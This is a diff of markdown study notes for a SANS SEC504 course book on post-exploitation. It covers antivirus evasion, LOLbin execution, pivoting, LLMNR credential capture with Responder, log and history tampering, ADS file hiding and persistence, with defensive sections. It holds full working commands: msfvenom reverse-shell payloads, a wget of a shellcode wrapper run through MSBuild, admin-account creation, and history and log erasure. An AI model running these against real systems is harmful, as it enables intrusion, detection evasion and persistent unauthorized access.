@@ -6,455 +6,933 @@ tags: ["sans504"]
 slug: "sec-504/sans504/sec-504-book5"
 ---
 
-the last book already :(  ,so here we will start to shift into focus what attacker do post exploitation, ofc then don't just sit in the system what do they do we’ll find out here.
+The last book already :(, here we'll shift focus to what attackers do after exploitation. Of course, they don't just sit in the system; let's find out what they actually do.
 
-## Endpoint Security Bypass:
+## Endpoint Security Bypass
 
-for most modern system attackers expect that there will be an endpoint security system, whether is the legacy antivirus that uses signature detection or an endpoint detection and response platform, now attackers have two ways to deal with it one to modify an existing tool to evade detection or two modify there tactics to use tools and techniques that achieve there goals without raising an alert. for sophisticated attacker bypassing an end point security system is always possible but not from the first try.
+For most modern systems, attackers expect an endpoint security system to be in place — whether it's legacy antivirus with signature detection or an endpoint detection and response (EDR) platform. Attackers have two main strategies to deal with this: modify an existing tool to evade detection, or adapt their tactics to use tools and techniques that achieve their goals without triggering an alert. For sophisticated attackers, bypassing endpoint security is always possible, though rarely on the first attempt.
 
-### Ghostwriting:
+### Ghostwriting
 
-is the process of modifying the assembly of an executable in order to bypass endpoint detection system by inserting junk code (lines of code that modify the program, but with no lasting change on the execution of the program). Ex. a program that prints the sum of `2+2` so  u make it calculate the value of `2-(-2)` same output different method, you can make a modification like `adding 10` the `subtracting 10` . as you can see this will not change the program output but will make it evade detection. 
+Ghostwriting is the process of modifying an executable's assembly code to bypass endpoint detection by inserting junk code — lines that change the program's behavior or structure without affecting its actual output. For example, a program that prints the sum of `2+2` could instead calculate `2-(-2)`, producing the same result through a different method. Or you could add 10 and then subtract 10. The program output stays the same, but the file's hash changes, allowing it to evade detection.
 
-### steps:
+### Steps
 
-Create an .exe
+1. Create an `.exe`
+2. Convert it to an `.asm` file
+3. Edit the `.asm` file
+4. Convert it back to an `.exe` file
 
-Convert it to an .asm file
+Let's walk through this on a real executable. First, you need a binary to work with:
 
-Edit the .asm file
+```bash title="Generate a reverse-shell payload with msfvenom"
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.144.151 LPORT=4444 -f raw -o payload.raw --platform windows -a x86
+```
 
- Convert it back to an .exe file
+Next, use the Metasm library to convert the raw file to ASCII assembly source:
 
-lets get into the steps of doing this on a real executable, so the first step is to for you to have a binary to start with so lets start with making a binary using `msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.144.151 LPORT=4444 -f raw -o payload.raw --platform windows -a x86`, to generate a payload to preform a reverse TCP connection, then save it. Next use Metasm library to convert the row file`payload.raw` to ASCII asm source`payload.asm`, using this command `ruby /opt/metasm/samples/disassemble.rb payload.raw >payload.asm`.
+```bash title="Disassemble the payload to ASM"
+ruby /opt/metasm/samples/disassemble.rb payload.raw > payload.asm
+```
 
-now what we need to do is to edit the assembly file and obfuscate it, First lets look for any xor in the code, we look for `xor’ing` a registry against it self in order to empty it as xor by it self equal zero. we can also add a `PUSH`and `POP` operation, all this dose is just add code that dose nothing but cover up the dirty code, changing the hash of the file making it undetected by antiviruses.
+Now edit the assembly file to obfuscate it. Look for `xor` operations — where a register is XORed against itself to zero it out — and add `PUSH`/`POP` operations that do nothing except add noise to cover the real code. This changes the file hash, making it undetectable by antivirus.
 
-after making the changes to the asm source , we recompile it back into a PE executable using this command `ruby /opt/metasm/samples/peencode.rb payload.asm -o payload.exe`, after this the attacker will test it locally to see if is evades the endpoint security system, in most cases multiple edits will be made until its working.
+After modifying the assembly source, recompile it back into a PE executable:
 
-### DefenderCheck:
+```bash title="Recompile the obfuscated assembly to EXE"
+ruby /opt/metasm/samples/peencode.rb payload.asm -o payload.exe
+```
 
-for an attacker the question is how much ghostwriting is needed until its not detected, and which parts on the file should i change. attackers will use OSINT to discover the endpoint protection system used by the target install it locally and isolate it from the internet then use this system to test there sample on it until it can  evade it successfully.
+The attacker then tests it locally to see if it evades the endpoint security system. In most cases, multiple edits are required before success.
 
-DefenderCheck is a tool that helps attackers with this process, so here is exactly what it dose , it takes a file and scans it on a local windows 10 using Windows defender if it raises an alert it will split it in two and scan then indecently, discarding the part that dose not raises an alert and so on until it pin point the chunk that raising an alert. 
+### DefenderCheck
 
-in the example it checks the Mimkatz executable scanning it until if identifies a 112 byte chunk that alerts windows, now the attacker can focus on using ghostwriting techniques to modify this part and make a version that undetected. 
+For an attacker, the key questions are: how much obfuscation is needed before it's undetected, and which parts of the file need to change? Attackers often use OSINT to discover the target's endpoint protection system, install it locally, isolate it from the internet, and then test their sample against it until it evades successfully.
 
-![image.png](././Sec_504_book5/image.png)
+:::tip
+DefenderCheck is a tool that helps automate this process. It takes a file and scans it on a local Windows 10 system using Windows Defender. If an alert is raised, it splits the file in two and scans each half independently, discarding the half that doesn't trigger an alert. It repeats this binary-search approach until it pinpoints the exact chunk causing the alert.
+:::
 
-### Additional endpoint bypass techniques:
+In the example shown, DefenderCheck scanned the Mimikatz executable and identified a 112-byte chunk that triggered Windows Defender. The attacker can then focus ghostwriting techniques on modifying just that section to create an undetected version.
 
-deploying the malware on the system exclusion directory that now scanned by the endpoint detection system, use keyed payload which is when the payload is encrypted using a key that taken from the environment variable, so the key is not in the binary itself and so the signature will be different for each instance of the malware. and using lesser known language like Golang as some products have issues parsing go. also attackers can digitally sign there malware, as it marks it some what trusted.
+![image.png](./Sec_504_book5/image.png)
 
-most of the projects that provided new techniques for evading endpoint security systems have all closed there doors, as tools like this becomes popular the endpoint suite add detection for this project. so developers stop sharing there techniques publicly to prolong there private use. this is bad for defenders as since this slows down the rate endpoint detection systems can improve and detect new techniques.
+### Additional Endpoint Bypass Techniques
 
-one technique that still works is living off the lands or LOL so instead of using third party apps attackers just abuse existing trusted tools to accomplish there gools. 
+- Deploy malware to a system exclusion directory not scanned by the endpoint detection system.
+- Use keyed payloads, where the payload is encrypted using a key taken from an environment variable. The key isn't in the binary itself, so the signature differs for each malware instance.
+- Use lesser-known languages like Golang, since some security products have parsing issues with Go binaries.
+- Digitally sign malware to mark it as somewhat trustworthy.
 
-### LOL ─ Atbroker Invocation:
+:::note
+Most projects that published new endpoint evasion techniques eventually closed down. As tools gain popularity, endpoint suites add detection for them, so developers stop sharing techniques publicly to extend their private utility. This is bad for defenders, as it slows the rate at which EDR systems improve and detect new techniques.
+:::
 
-so using a built in tool that signed and included in windows by Microsoft to lunch malicious content. so attackers abuse it to lunch malware at the same level of trust. in this Ex. we cant lunch a malware.exe so we can configure stbroker.exe to run any arbitrary executable on the system , by making a registry key for the malware as such `HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Accessibility\ATs\malware`, and add two registry entries `TerminateOnDesktopSwitch` with a `REG_DWORD` value of 0 (zero) and `StartExe` with a path to the malware executable. which will make the malware run evading the endpoint security control. 
+One technique that still works is **Living Off The Land (LOL)** — instead of using third-party tools, attackers abuse existing trusted Windows tools to accomplish their goals.
 
-### MSBuild C# Execution:
+### LOL — Atbroker Invocation
 
-is another opportunity for attackers. its used to build and execute C, C++, C#. code an attacker can use MSBuild to run code written in any of the C lang’s by compiling and running a source file. for an attackers that a great opportunity since MsfVenom can export any Metasploit payload into C# code. so using this command `msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.0.6 lport=4444 -f csharp > meterpreter.cs`, MSBuild cant compile and run this C# code directly so the attacker download an MSBuild shellcode wrapper.  `wget https://tinyurl.com/msbuildshellcode -O file.csp`, `nano file.csproj # Replace shellcode with new payload` , Next per our usual practice, start a Metasploit handler waiting for the reverse TCP payload.  `msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LPORT 4444; set LHOST 0.0.0.0; exploit"` , with the modified MSBuild shellcode wrapper the attacker can execute the MsfVenow payload using the MSBuild.exe executable. `c:\windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe file.csproj`
+:::caution
+Using a built-in Windows tool signed and included by Microsoft to launch malicious content. Attackers abuse it to launch malware with the same level of trust as the legitimate tool itself.
+:::
 
-### Defenses:
+Instead of launching `malware.exe` directly, an attacker can configure `atbroker.exe` to run any arbitrary executable by creating a registry key:
 
-bypassing an endpoint protection system is always possible with time, this doesn't mean defenders should give up on endpoint protection system, but invest in a good EDR platform that current and will-maintained , lavage features like app trust list, threat hunting, logging and monitoring systems. also  User and Entity Behavior Analytics (UEBA) tools are also valuable to capture normal system behavior and to identify deviations from those patterns (e.g., WS-ACCT-05 is running MSBuild.exe and has never done so before).
+```
+HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Accessibility\ATs\malware
+```
 
-the main benefit of these tools are not that thy stop the attackers form the first time, every time in most cases, they will stop the attackers initially , then they will find a technique to evade it eventually, however this first block / log will give you a heads up, when paired with rapid incident response this may stop the whole attack.
+Then add two registry entries:
 
-![image.png](././Sec_504_book5/image_1.png)
+- `TerminateOnDesktopSwitch` with a `REG_DWORD` value of `0`
+- `StartExe` with a path to the malware executable
 
-## Pivoting and Lateral Movement:
+This causes the malware to run while evading endpoint security controls.
 
-attackers can reuse there command and control C2 access to pivot and gain access to new hosts in the network, like using the Meterpreter C2 framework, either deployed as part of the initial exploit or through an independent payload generated using MsfVenow.
+### MSBuild C# Execution
 
-### Meterpreter Pivoting:
+MSBuild is used to build and execute C, C++, and C# code. An attacker can leverage it to compile and run code directly from source files. Since MsfVenom can export any Metasploit payload as C# code, this becomes an attractive option:
 
-Meterpreter offers serval options to make it easy for an attacker to access the internal network target by reusing the C2 link. Lets look at the example, we have the attacker `96.97.98.99`has compromise the internal system at `10.10.10.11`(whatever the method is ), so this internal system becomes the week link or the pivot point.
+```bash title="Export Metasploit payload as C# code"
+msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.0.6 lport=4444 -f csharp > meterpreter.cs
+```
 
-![image.png](././Sec_504_book5/image_2.png)
+MSBuild can't compile and run C# code directly, so the attacker downloads an MSBuild shellcode wrapper:
 
-using Meterpreter an attacker can start a proxy server to listen on the `96.97.98.99`that forwards all traffic through the C2 link within, inside the organization all the traffic will appear to be from `10.10.10.11`, but is actually from the attacker. 
+```bash title="Download MSBuild shellcode wrapper"
+wget https://tinyurl.com/msbuildshellcode -O file.csproj
+```
 
-also an attacker can reuse the Meterpreter C2 link and leverage additional Metasploit exploits or `auxiliary`modules to attack the internal system using the `route`command.
+Edit the wrapper to insert the new payload:
 
-also attackers can connect to a specific port and IP within the network you can setup a port forwarder using the `portfwd`command. like so `portfwd add -l 8000 -r 10.10.10.100 -p 80`.
+```bash title="Edit the MSBuild project file"
+nano file.csproj
+```
 
-### ROUTE Pivoting:
+Start a Metasploit handler waiting for the reverse TCP connection:
 
-so lets start with an existing session in Meterpreter obtained through `exploit/windows/smb/psexec`we’ll use the `background`command to go back to the console prompt. then start the `rout`command so any access to the `10.10.10.0/24`  network should be delivered through the Meterpreter session here, once established any Metasploit where the `RHOST`targets an IP in that IP range it will traverse to our session link.
+```bash title="Start Metasploit handler for incoming connection"
+msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LPORT 4444; set LHOST 0.0.0.0; exploit"
+```
 
-### Host Discovery and Port Scanning:
+With the modified MSBuild wrapper ready, execute the payload using the MSBuild.exe executable:
 
-Metasploit route feature can be used for auxiliary modules as well, allowing to perform port scanning within Metasploit, lets assume we have a session ,but there is no built in port scanners, as it can only preform LAN host scanning using the `arp_scanner` module, like so `run arp_scanner -r 10.10.10.0/24`, and if any hosts are found we can follow that up with a port scanning on them. there are several modules can be used like namp db_nmap and `auxiliary/scanner/portscan/tcp`, now we can specify the ports we want to scan  and start scanning.  
+```bash title="Execute payload via MSBuild.exe"
+c:\windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe file.csproj
+```
 
-for Linux or UNIX systems , SSH can help and offer some features for pivoting, like we can use SSH to set up a simple port forward through the host to a specific target. lets take a look at this command `ssh -L 8000:10.10.10.100:80 victortimko@10.10.10.11`, where the `-L` is to establish additional port forwarding the first IP is the victim and the second is where  the data is forworded to. another option is to use the `-D` followed by an arbitrary port number will start a SOCKS proxy server to the attacker system, allowing them to use any SOCKS proxy-aware client to communicate through SSH tunnel. 
+### Defenses
 
-for windows systems we have netsh a built-in command line tool to listen and forward any activity to a remote IP and TCP port, using a command like this  `netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8000 connectaddress=10.10.10.100 connectport=80`, but with one little change the listening port here  is the victim’s not the attackers. 
+Bypassing endpoint protection is always possible with enough time — but that doesn't mean defenders should give up. Instead, invest in a good, current, well-maintained EDR platform with features like application allowlisting, threat hunting, logging, and monitoring. User and Entity Behavior Analytics (UEBA) tools are also valuable for capturing normal system behavior and identifying deviations from those patterns (e.g., `WS-ACCT-05` is running `MSBuild.exe` and has never done so before).
 
-pivoting doesn't require complex  poet redirectors , it can be achieve using a lot of lolbins, like in UNIX we can use `smbclient` to attack a system instead of installing `nmap` , or use `ncat` to port scan instead of proxy servers use `wget` and `curl` to interact with the web server,  and for windows PowerShell offers powerful functionality that mirrors powerful UNIX tools.
+:::important
+The main benefit of these tools isn't that they stop attackers every time on the first attempt. In most cases, they'll stop the attacker initially, then the attacker finds a technique to evade it eventually. However, that first block or log gives you a heads-up. When paired with rapid incident response, this early detection may stop the entire attack chain.
+:::
 
-Pivoting through a compromised system is really a question of opportunity for an attacker. What new targets, data resources, and opportunities for evasion become possible using pivoting. 
+![image.png](./Sec_504_book5/image_1.png)
 
-Lateral movement involves many of the same attacks that we've already looked at in this course, but it also introduces new opportunities for an attacker. Some attacks such as machine-in-the-middle (MITM) attacks or local password harvesting attacks only become possible after an initial compromise, or through access to a privileged network position. In this book, we'll continue to look at lateral movement techniques within the network, using pivot points to make these attacks possible
+## Pivoting and Lateral Movement
 
-![image.png](././Sec_504_book5/image_3.png)
+Attackers can reuse their command-and-control (C2) access to pivot and gain access to new hosts in the network — for example, using the Meterpreter C2 framework, either deployed as part of the initial exploit or through an independent payload generated with MsfVenom.
 
-## Hijacking Attacks:
+### Meterpreter Pivoting
 
-this attack , the adversary response for a system request for a service, and pretending to be a legitimate system, sometimes this involves the use of Machine-In-The-Middle MITM, is also operates by observing podcasted request for the server on the LAN and inject a response to be processed by the client (target), for attackers one powerful opportunity to abuse is a resolution protocol like the Link-Local Multicast Name Resolution (LLMNR), pretend to be a server and trick the victim into sending authentication credentials. the Ex. here explain this attack where a victim send a multicast LLMNR massage to the LAN asking for sevrer01 a type by the user, failing DNS resolving into an LLMNR request, all the devices see the request but non response, except the attacker saying i’m sevrer01 with there IP add so the victim connects to in and sends an authenticate request calculated with the victim password hash that the attacker can then use for password cracking material.
+Meterpreter offers several options to let an attacker access the internal network by reusing the C2 link. Consider this example: an attacker at `96.97.98.99` has compromised an internal system at `10.10.10.11` (through any exploitation method), making that internal system the pivot point.
 
-### Responder:
+![image.png](./Sec_504_book5/image_2.png)
 
-the tool Responder is a powerful example of hijacking attack, in windows environment Responder wait for any LLMNR request and act as a windows SMB server where a victim try to connect and there credentials are logged automatically. lets take a look at how attackers do there lil tricks we’ll be using Linux though  there are a windows version, `sudo /opt/Responder/Responder.py -I eth0` , this start the responder app where the `-I` specify the target interface , and we can also use `-i` if you want to forwarded the captured data to another machine. 
+Using Meterpreter, the attacker can start a proxy server listening on `96.97.98.99` that forwards all traffic through the C2 link. From inside the organization, all traffic appears to originate from `10.10.10.11`, but it's actually from the attacker.
 
-when a user request a service where the hostname isn't answered responder will reply to the final resolution attempt multicast DNS with the attackers IP , this force the user to connect to the attacker service possibly disclosing NTLMv2 authentication hash info. 
+An attacker can also reuse the Meterpreter C2 link and leverage additional Metasploit exploits or `auxiliary` modules to attack internal systems using the `route` command.
 
-### Defenses:
+Attackers can also connect to a specific port and IP within the network by setting up a port forwarder using the `portfwd` command:
 
-the best defense is to disable it LLMNR support on servers and workstation, it was once valuable to small workstation. LLMNR can be disabled using Group Policy by visiting `Computer Configuration | Administrative Templates | Network | DNS Client`, and enabling the Turn off multicast name resolution option. also LLMNR can be disabled using a local system's Local Policy Editor or through a registry edit. also enable VLANs whenever you can also use Further User and Entity Behavior Analysis (UEBA) tools, either host-based or network-based, can also be valuable to quickly characterize attacks that would indicate post-compromise activities.
+```bash title="Set up port forwarding through Meterpreter"
+portfwd add -l 8000 -r 10.10.10.100 -p 80
+```
 
-![image.png](././Sec_504_book5/image_4.png)
+### ROUTE Pivoting
 
-## Covering Tracks:
+Starting with an existing session obtained through `exploit/windows/smb/psexec`, use the `background` command to return to the console prompt. Then issue the `route` command so any access to the `10.10.10.0/24` network is delivered through the Meterpreter session. Once established, any Metasploit module targeting an IP in that range will traverse through the session.
 
-attackers have three big goals compromising the target,  achieving post- exploitation goals , and evade detection for as long as possible. step in evading detection vary from minor changes like (such as cleaning up extraneous files an exploit leaves behind), and sophisticated log removal and deployment of rootkits.
+### Host Discovery and Port Scanning
 
-### Hiding Files in UNIX:
+Metasploit's route feature also works with auxiliary modules, allowing port scanning within Metasploit itself. Assuming you have a session, use the `arp_scanner` module for LAN host discovery:
 
-in UNIX/Linux systems hidden filles are those files that begins with a dot as the first character, as defenders we know we can view these files with the ls -a, but we don't use it this much cuz it can show much unneeded files , in addition to using this method attackers may store files inside directories which might not be noticed like the `/dev, /tmp, /etc` ,`/dev`this contains info about the devices in the systems like chunks of your hard drive and references to terminal, its full of files.`/tmp` this contains strangely named files created by various applications to store temporally data. Making it  a good hiding spot but it gets deleted on reboot, soo attackers need to restore that data to this location. another set of locations is to store data in complex parts in the file system, as users don't  understand these parts and admins don't care to scour these areas either. like the `/use/local/man` (the main pages), and the `/usr/src` (containing source code in Linux). with privileged access to the file system, attackers can create directories of there own that blends with with other legit directories, lets take a look at this example `/etc/initd` with all the file extensions changed to .conf despite being tar files, this `/etc/initd` doesn't look out of shape but the real directory name is `/etc/init.d` , so here the attacker tried to mislead the defenders, if the attacker doesn't have root access to the system they will be limited to were they can write the files. this command `find / -type d -perm -0222 2>/dev/null` 
-will show you all the directories this user can write to.
+```bash title="Scan for hosts using ARP"
+run arp_scanner -r 10.10.10.0/24
+```
 
-### UNIX Log Editing:
+If hosts are found, follow up with port scanning using modules like `auxiliary/scanner/portscan/tcp`, specifying which ports you want to scan.
 
-after attacks take over a system , they usually want to alter the system logs to erase the entries associated with the techniques hey used to gain access to they system, some might just clear the whole logs deleting every thing on the system, but this is easily noticeable by the sysadmins, more sophisticated attacks will only delete selected entries from the log file. only entities where the attacker gained access like incorrect logins or process crashing will be removed.  on a UNIX system the syslog process stores logs for the machine, the configuration for the system logger is found in the `/etc/syslog.conf` file, when a carful attacker takes over a system they will loot at the system stores its log config file and modify it. by default UNIX sores there logs in the`/var/log`directory, some apps have there own directories Ex. Apache use the `/var/log/httpd` , and Nginx use `/usr/local/nginx/logs`. with root privilege an attacker can edit the log file many of the logs in the `/var/log` are written in ASCII so they are editable using any text tool like `vi` or `nano`.
+For **Linux or UNIX systems**, SSH offers useful pivoting features. Set up a simple port forward through the host to a specific target:
 
-### shell history:
+```bash title="SSH port forward"
+ssh -L 8000:10.10.10.100:80 victortimko@10.10.10.11
+```
 
-whenever you type a command in UNIX shell the shell have the option of recording each command. by default the bash shell history is stored in `$HOME/.bash_history` for each user , the default size is 500 commands but some go up to a 1000 recent command, attackers don't want the investigators to know what happened so they will often edit the bash history file. the history is written when the shell is executed , and the most recent command is not store in the file as they are stored in the RAM  first, this is an opportunity for attackers as they can run some commands to prevent the command form being saved like, `unset HISTFILE` or `kill -9 $$` . in some Linux distros placing a space before the command will eliminate it form being saved to the shell history but only when the when the environment variable `HISTCONTROL` is set with the value `ignorespace`. 
+The `-L` flag establishes port forwarding; the first IP is the victim, and the second is where data is forwarded.
 
-### Accounting entries in UNIX:
+Alternatively, use the `-D` flag followed by an arbitrary port number to start a SOCKS proxy server on the attacker system, allowing any SOCKS-aware client to communicate through an SSH tunnel.
 
-UNIX systems have four files known as the accounting files, the `utmp`file stores information about all users currently logged in the system. this file is consulted by the `who`command to print a list of users with actively logged in sessions on the system, `wtmp`file stores info about all users who have ever logged into the machine, `btmp`files stores info about bad login attempts, this is often  configured to set off because it stores bad user ID attempts as they might have password accidentally typed by the users, the `lastlog`file shows info associated with the most recent login time and date for each user. attackers want to modify these files so sysadmins cant tell what they are up to, but attackers cant simply edit the `utmp, wtmp, btmp and lastogin` files, these files are written in a `utmp`structure so it must be edited with a tool that support it,  while tools are there to edit these files but attackers just remove them all. 
+For **Windows systems**, use `netsh`, a built-in command-line tool to listen on a port and forward activity to a remote IP and TCP port:
 
-### Windows - Alternate Data Streams:
+```bash title="Windows port proxy with netsh"
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8000 connectaddress=10.10.10.100 connectport=80
+```
 
-attackers will always leverage techniques to hide their activities from defenders. for windows this comes down to hiding files and processes, or hiding evidence of an attack from the event log files. one opportunity is to hide files in the `NTFS, ReFS`file systems, it leveraging the Alternate Data Streams ADS,  in supported file systems ADS streams allow a single file to have a default stream of data while also supporting additional independent data streams. the stream content follows the files as its copied /moved to different partitions as long as its file system supports ADS, when defenders examine files using the `dir, Get-ChildItem` or even open windows Explorer they only see the default streams.  
+:::note
+The listening port here is on the victim's system, not the attacker's.
+:::
 
-### creating ADS:
+Pivoting doesn't require complex redirectors — it can be achieved using many LOLbins: on Unix, use `smbclient` to attack systems instead of installing Nmap, or use `ncat` for port scanning. Instead of proxy servers, use `wget` and `curl` to interact with web servers. On Windows, PowerShell offers powerful functionality that mirrors Unix tools.
 
-you can use the type command like here `type NTDS.dit > Kitchen.docx:NTDS.dit` , where the first part is the `NTDS.dis` you want to put in the `kitchen.docx` file to hide it, and in PowerShell attackers use `Set-Content` to add an additional data stream, like in this command `Get-Content -Path .\NTDS.dit | Set-Content -Path .\OfficeKitchen.docx -Stream NTDS.dit`, where first we read the file using `Get-content` , then writing the new stream to it using the `Set-Content` with the new stream name. notepad can also be used to hide data in ADS using a command like this `notepad defaultfile.txt:secretfile.txt`, the data store in an ADS can be anything the attacker wants such as binary files , PowerShell script Microsoft office files and even executable, and to lunch them these files attackers use this command `wmic process call create C:\TEMP\OfficeKitchen.docx:flamingo.exe`, the last part is the full path and the ADS name. 
+Pivoting is ultimately a question of opportunity for the attacker — what new targets, data resources, and evasion opportunities become possible through pivoting?
 
-### finding ADS:
+Lateral movement involves many of the same attacks covered earlier in this course, but it also introduces new opportunities. Some attacks — like man-in-the-middle (MITM) attacks or local password harvesting — only become possible after an initial compromise or through access to a privileged network position.
 
-several tools area available to identify alternative data streams some are built-in command like the `dir /r` which will show all the files and data streams in this directory , and also the PowerShell’s  `Get-Item * -Stream *`, but in PowerShell you can also search all subdirectories limiting the finding to only not default data-streams using this command `Get-ChildItem -recurse | ForEach { Get-Item $_.FullName -stream * } | Where stream -ne ':$DATA'`,also Microsoft Sysinternals tool `streams64.exe -s -d` will identify alternate data streams recursively `-s`, with the added ability to remove non-default streams `-d` .
+![image.png](./Sec_504_book5/image_3.png)
 
-### Defenses:
+## Hijacking Attacks
 
-one of the most effective ways to defend logs is to just use a separate logging server, if the attacker takes over one of the systems they can find the logs and alter them, but if these logs are sent into a remote system he wont be abele to remove all the evidence, instead they will need to attack the logging server.  in UNIX the syslog process can be easily configured to send logs to remote host by editing the conf file , for windows you can deploy the Windows Event Forwarding WEF tool. as well as using User and Entity Behavioral Analytics , look at gaps or corrupted logs and look for unusual files.
+In a hijacking attack, the adversary responds to a system's request for a service, pretending to be a legitimate server. This often involves machine-in-the-middle (MITM) techniques — observing multicast requests on the LAN and injecting a response for the client to process.
 
-![image.png](././Sec_504_book5/image_5.png)
+For attackers, one powerful opportunity is exploiting resolution protocols like Link-Local Multicast Name Resolution (LLMNR). By pretending to be a server, the attacker tricks the victim into sending authentication credentials. Here's how: a victim sends a multicast LLMNR message asking for `server01` (typed by the user), which fails to resolve via DNS and falls back to LLMNR. All devices on the LAN see the request, but none respond — except the attacker, who replies "I'm server01" with their IP. The victim connects and sends an authentication request encrypted with their password hash, which the attacker can then use for password cracking.
 
-## Establishing Persistence:
+### Responder
 
-one goal for almost all attackers it to establish a persistence mechanism on a compromised host, many exploits and attacks wont grant an attacker persistence mechanism on a system, as a reboot or any defensive action may terminate the attacker access, that why persistence is needed 
-choosing a persistence mechanisms depend on other goals like: regain access to compromised system, avoid detection, preserve privileges and access, Flexible triggers for reestablishing access. for many attackers the persistence method is built into the attack framework and the C2 tools used against the system. this could be Metasploit Meterpreter, or any tool or framework.
+:::tip
+Responder is a powerful hijacking attack tool. On Windows, it waits for LLMNR requests and acts as a Windows SMB server. When a victim tries to connect, their credentials are logged automatically. A Linux version also exists.
+:::
 
-### Persistence on Windows:
+On Linux, start the Responder application:
 
-### Creating Accounts:
+```bash title="Start Responder on a network interface"
+sudo /opt/Responder/Responder.py -I eth0
+```
 
-the most straightforward way an attacker can establish persistence on a system, we know the `net user` command can enumerate users on windows, but it can also be used to creating an account and making it admin, using this Meterpreter shell established from a previous exploit we can run commands of the victim windows system , using the `execute`allows the attacker to run any local commands with the `-f` argument , the command feed will run as a background non interactive process.`execute -f "net user /add assetmgtacct Att@ckerPassw”` , this command will create the user with the given name and password (where the password must meet the minimum password complexity requirement ), after creating the user attacker will add him to the local administrators group with this command`execute -f "net localgroup administrators /add assetmgtacct"`,  finally to verify every thing is working executing this command `execute -i -f "net user"`  where the `-i`gives you back the output and makes it interactable not just feeding the command like the past commands.
+The `-I` flag specifies the target interface; you can also use `-i` to forward captured data to another machine.
 
-### Services:
+When a user requests a service where the hostname isn't resolved by DNS, Responder replies to the final resolution attempt (multicast DNS) with the attacker's IP, forcing the user to connect to the attacker's service and potentially disclosing NTLMv2 authentication hash information.
 
-in addition to OS specific commands Metasploit and other frameworks offers scripts for persistence in a more automated manner. like the `persistent service`exploit. Windows services are background tasks that are managed by the OS  and can startup automatically at boot based on another service or after a specified delay, making it a golden opportunity to me misused and establish persistence. the Metasploit `persistence_service`module will automate the process of creating the service and running automatically generated payload written to temp directory.
+### Defenses
 
-### Silent Process Exit:
+The best defense is to disable LLMNR support on servers and workstations. LLMNR was once valuable for small workgroups, but it's now primarily a liability. Disable it using Group Policy by navigating to:
 
-attackers try to abuse built-in facilities in Windows to establish persistence, in this way it wont look suspicious making a better way to evade detection, Windows includes lots of features made  for developers, one of them is the silent process exit debug, which is used by developers to lunch a debugger process when a target process is terminated (normally or unexpectedly), but its used by attackers as a persistence mechanism.  in Metasploit there is the exploit  `persistence_image_exec_options` which lavage the silent process exit mechanism but to start it needs SYSTEM privileges, which means attackers first step is to mitigate into a process withe this privilege using this command `migrate -N GoogleCrashHandler64.exe`where the crash_handler is a system privilege process you can run `ps -s` from Meterpreter to list all SYETEM processes, then background the process , and start to load the exploit using `use exploit/windows/local/persistence_image_exec_options`, after doing so the attacker start to set the `lhost` and `port`, `image_file` indicate after which process exit we should start  another , and `payload_name`is which process will be opened after the exit finally lunch with `run` .
+```
+Computer Configuration | Administrative Templates | Network | DNS Client
+```
 
-these are all the parameters and what inputs they take , so the process will start after notepad is closed and will lunch the calc.exe
+Enable the "Turn off multicast name resolution" option. LLMNR can also be disabled through the Local Policy Editor or via a registry edit on individual systems.
 
-`set lhost 10.10.75.1`
+Additionally, enable VLANs whenever possible and use User and Entity Behavior Analysis (UEBA) tools — either host-based or network-based — to quickly identify post-compromise activity patterns.
 
-`set image_file notepad.exe`
+![image.png](./Sec_504_book5/image_4.png)
 
-`set path c:\\temp`
+## Covering Tracks
 
-`set payload_name calc`
+Attackers have three major goals: compromising the target, achieving post-exploitation goals, and evading detection for as long as possible. Evasion steps range from minor file cleanup to sophisticated log removal and rootkit deployment.
 
-`set session 1`
+### Hiding Files in UNIX
 
-`run`
+In UNIX/Linux, hidden files begin with a dot. Defenders can view them with `ls -a`, but it shows many unneeded files, so this command is less frequently used.
 
-now lets imagine a scenario where the attackers Meterpreter process dies(windows reboots), the attacker want to reestablish the connection , so he just start a reverse tcp with the IP and wait for the victim to open and close notepad , so out debugger process will run establishing a new Meterpreter session with the attacker here we used notepad.exe but we can use any other process we want like outlook.exe word.exe, this   silent process exit configuration is persistent on the Windows system, saved in the Windows registry at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ProcessName`, where ProcessName is the silent process exit target. Anytime the attacker loses access to the compromised system, they need only wait for Notepad (or any other targeted process) to open and close to reestablish access. this mechanism is attractive to an attacker because they are less predictable for establishing access. Unlike a service that is always running, a silent process exit persistence mechanism may be dormant for hours to months depending on the usage of the victim system and the selected target process. 
+Attackers may also store files in directories less likely to be noticed:
 
-### WMI Event Subscription:
+- `/dev` — contains device info and references to terminals; it's full of files.
+- `/tmp` — contains temporary files created by applications. Good for hiding but deleted on reboot, so attackers must restore data to this location.
+- Complex filesystem areas like `/usr/local/man` (manual pages) or `/usr/src` (source code), which users don't understand and admins rarely inspect.
 
-Windows Management Instrumentation(WMI) is a built-in feature it allows users to interface with the drivers and system components(built-in and third party) to collect data also allows users to subscribe to and be notified of arbitrary Windows events. that similar to scheduled tasks, where code run based on a condition like a time of day or delay , but this is even more flexible, WMI can run a code/ program based on almost any system behavior like boot up failed login CPU spikes disk full message and many other events. this flexibility is valuable for attackers as a persistence mechanism like scheduled tasks and attacker can create a process that will run and establish C2 connection to the attackers, but with WMI attackers get the nearly unlimited flexibility for the type of event that triggers the code execution.
+With privileged access, attackers can create directories that blend with legitimate ones. For example, `/etc/initd` with `.conf` file extensions (despite being tar files) could be mistaken for a real configuration directory, since the actual directory is `/etc/init.d`.
 
-to leverage WMI attackers have several options one is to write a Managed Object File F with a `.mof` extension that describes the subscription service and the event to trigger that will run the malicious code. the MOF language is similar to C++ in syntax and its compiled and executed using Windows built-in tool `mofcomp.exe` , the other way to leverage WMI is to use the built-in `wmi_persistence`exploits on Metasploit framework or other tools.
+Without root access, attackers are limited to directories they can write to. Find these with:
 
